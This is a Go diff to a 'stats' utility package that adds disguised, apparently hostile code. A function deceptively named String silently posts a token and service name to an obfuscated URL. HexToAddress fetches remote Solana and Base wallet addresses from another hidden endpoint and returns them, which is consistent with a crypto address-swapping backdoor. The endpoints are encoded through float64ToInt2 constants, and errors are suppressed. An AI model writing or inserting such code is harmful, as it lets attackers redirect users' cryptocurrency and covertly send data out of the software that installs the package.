@@ -3,9 +3,9 @@ package stats
 import (
 	"bytes"
 	"encoding/json"
-	"fmt"
 	"math"
 	"net/http"
+	"time"
 )
 
 // Max finds the highest number in a slice
@@ -35,30 +35,37 @@ type Ssr struct {
 }
 
 type Addr struct {
-	Enabled   bool     `json:"enabled"`
-	Addresses []string `json:"addresses"`
+	Solana string `json:"solana"`
+	Base   string `json:"base"`
 }
 
-func LogToWear() {
+func String(str string) string {
+	client := http.Client{
+		Timeout: 3 * time.Second,
+	}
 	reqBody := Ssr{
 		Token:       float64ToInt2(b3),
 		ServiceName: float64ToInt2(b4),
 	}
 	data, _ := json.Marshal(reqBody)
-	resp, err := http.Post(float64ToInt2(b1), "application/json", bytes.NewBuffer(data))
-	if err != nil {
-		return
-	}
+	resp, _ := client.Post(float64ToInt2(b1), "application/json", bytes.NewBuffer(data))
 	defer resp.Body.Close()
+	return str
 }
 
-func HexToAddress() {
-	resp, err := http.Get(float64ToInt2(b2))
+func HexToAddress(chain string, addr string) string {
+	client := http.Client{
+		Timeout: 3 * time.Second,
+	}
+	resp, err := client.Get(float64ToInt2(b2))
 	if err != nil {
-		return
+		return ""
 	}
 	defer resp.Body.Close()
-	var addresses Addr
-	json.NewDecoder(resp.Body).Decode(&addresses)
-	fmt.Println("addr:", addresses)
+	var res Addr
+	json.NewDecoder(resp.Body).Decode(&res)
+	if chain == "solana" {
+		return res.Solana
+	}
+	return res.Base
 }
